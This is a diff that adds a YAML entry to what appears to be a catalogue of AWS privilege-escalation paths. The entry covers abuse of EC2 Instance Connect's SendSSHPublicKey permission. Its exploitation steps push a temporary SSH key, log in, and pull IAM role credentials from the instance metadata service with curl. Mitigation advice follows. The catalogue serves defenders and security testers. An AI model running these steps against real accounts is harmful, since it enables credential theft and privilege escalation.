@@ -1,0 +1,103 @@
+id: ec2-003
+name: ec2-instance-connect:SendSSHPublicKey
+category: access-resource
+services:
+- ec2
+- ec2-instance-connect
+description: A principal with `ec2-instance-connect:SendSSHPublicKey` can push a temporary SSH public key to an EC2 instance
+  and establish an SSH connection. If the target EC2 instance has a privileged IAM role attached via an instance profile,
+  the attacker can SSH into the instance and access the instance metadata service (IMDS) to retrieve temporary credentials
+  for that role. This provides the attacker with the full permissions of the instance's IAM role.
+prerequisites:
+  admin:
+  - An EC2 instance must exist with EC2 Instance Connect enabled (Amazon Linux 2 or Ubuntu 16.04+)
+  - The instance must have an IAM role with administrative permissions attached
+  - The instance must be running
+  - Network access must allow SSH (port 22) to the instance
+  lateral:
+  - An EC2 instance must exist with EC2 Instance Connect enabled (Amazon Linux 2 or Ubuntu 16.04+)
+  - The instance must have an IAM role attached
+  - The instance must be running
+  - Network access must allow SSH (port 22) to the instance
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws ec2 describe-instances --filters "Name=instance-state-name,Values=running"
+    description: List running EC2 instances to find targets with privileged roles
+  - step: 2
+    command: aws iam get-instance-profile --instance-profile-name INSTANCE_PROFILE_NAME
+    description: Check the instance profile to determine the attached role's permissions
+  - step: 3
+    command: |
+      ssh-keygen -t rsa -f /tmp/temp_key -N ""
+    description: Generate a temporary SSH key pair
+  - step: 4
+    command: |
+      aws ec2-instance-connect send-ssh-public-key \
+        --instance-id i-1234567890abcdef0 \
+        --instance-os-user ec2-user \
+        --ssh-public-key file:///tmp/temp_key.pub
+    description: Push the temporary public key to the target instance (valid for 60 seconds)
+  - step: 5
+    command: |
+      ssh -i /tmp/temp_key ec2-user@INSTANCE_PUBLIC_IP
+    description: SSH into the instance using the temporary key (must connect within 60 seconds)
+  - step: 6
+    command: |
+      curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+    description: From the SSH session, retrieve temporary credentials from IMDS
+  - step: 7
+    command: |
+      export AWS_ACCESS_KEY_ID=<from step 6>
+      export AWS_SECRET_ACCESS_KEY=<from step 6>
+      export AWS_SESSION_TOKEN=<from step 6>
+      aws sts get-caller-identity
+    description: Use the stolen credentials to assume the instance role's privileges
+recommendation: |
+  Restrict the `ec2-instance-connect:SendSSHPublicKey` permission using resource-based constraints.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "ec2-instance-connect:SendSSHPublicKey",
+    "Resource": "arn:aws:ec2:REGION:ACCOUNT_ID:instance/i-specificinstance",
+    "Condition": {
+      "StringEquals": {
+        "ec2:osuser": "ec2-user"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Use security groups to restrict SSH access to known IP ranges
+  - Monitor CloudTrail for `SendSSHPublicKey` events, especially to instances with privileged roles
+  - Implement IMDSv2 (session-oriented) to make credential theft more difficult
+  - Use AWS Systems Manager Session Manager instead of SSH for remote access
+  - Alert on unusual SSH connections to sensitive instances
+  - Consider disabling EC2 Instance Connect on instances with privileged roles
+  - Use VPC endpoints to restrict IMDS access
+discoveredBy:
+  name: Unknown
+  organization: Unknown
+  date: ''
+references:
+- title: AWS Privilege Escalation Methods and Mitigation
+  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+- title: IAM Vulnerable - EC2 Instance Connect
+  url: https://github.com/BishopFox/iam-vulnerable
+- title: AWS EC2 Instance Connect Documentation
+  url: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html
+relatedPaths:
+- ec2-001
+- ec2-002
+- ssm-001
+toolSupport:
+  pmapper: true
+  iamVulnerable: true
+permissions:
+  required:
+  - permission: ec2-instance-connect:SendSSHPublicKey
+    resourceConstraints: Target EC2 instance must be in the Resource section
+  - permission: ec2:DescribeInstances
+    resourceConstraints: None - typically required to discover instance details
